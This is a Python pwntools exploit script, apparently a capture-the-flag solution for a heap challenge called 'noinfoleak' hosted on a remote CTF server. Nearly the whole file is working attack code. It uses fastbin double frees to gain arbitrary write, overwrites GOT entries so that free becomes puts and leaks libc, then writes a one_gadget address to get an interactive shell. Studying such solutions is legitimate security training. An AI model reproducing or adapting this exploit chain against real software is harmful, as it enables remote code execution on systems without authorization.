#!/usr/bin/env python
# coding=utf-8
from pwn import *
debug = 0
local = 0
context.terminal=["tmux","splitw","-h"]
if local:
    a=process("./noinfoleak")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("ctf1.linkedbyx.com","10346")
    libc=ELF("./10.so")
if debug:
    gdb.attach(a,'''
   b *0x4009DC           
               ''')
                 # b *0x400A1E
elf=ELF("./noinfoleak")

def menu(index):
    a.recvuntil(">")
    a.sendline(str(index))
def create(size,content):
    menu(1)
    a.recvuntil(">")
    a.sendline(str(size))
    a.recvuntil(">")
    a.send(content)
def delete(index):
    menu(2)
    a.recvuntil(">")
    a.sendline(str(index))
def edit(index,content):
    menu(3)
    a.recvuntil(">")
    a.sendline(str(index))
    a.recvuntil(">")
    a.send(content)
#double free  

a.recv()
a.sendline("5")#puts 延迟绑定

create(0x50,"aaa")#index 0
create(0x40,"aa")#index 1
create(0x40,"asaa")#index 2
delete(1)
delete(2)
delete(1)
create(0x40,p64(0x6010A0))#index 3
create(0x40,"a")#index 4
create(0x40,"a")#index 5
read_got=0x000000000601048
payload=read_got
create(0x40,p64(payload))#index 6   ,0x6010b0:       0x0000000000601048      0x0000000000000040
                                       # index 1 ， ptr = read got 


create(0x50,"aaaaaaaa")#index 7
create(0x50,"bbbbbbbb")#index 8
delete(7)
delete(8)
delete(7)
fake_chunk_addr=0x601002-0x8
create(0x50,p64(fake_chunk_addr))#index 9
create(0x50,"aaa")#index 10
create(0x50,"aaa")#index 11

puts_plt=elf.plt["puts"]
#00 00 00 00 00
#0x601002-0x8+0x10
payload='\x00'*14+p64(puts_plt)
create(0x50,payload)  #index 12
delete(1)


read_addr=u64(a.recvuntil("\n",drop=True).ljust(8,"\x00"))
success("read address ==> 0x%x"%read_addr)
libc_base=read_addr -libc.symbols["read"]
one_gadget=libc_base+0xf1147
edit(1,p64(one_gadget))
a.recv()
a.sendline("30")
a.interactive()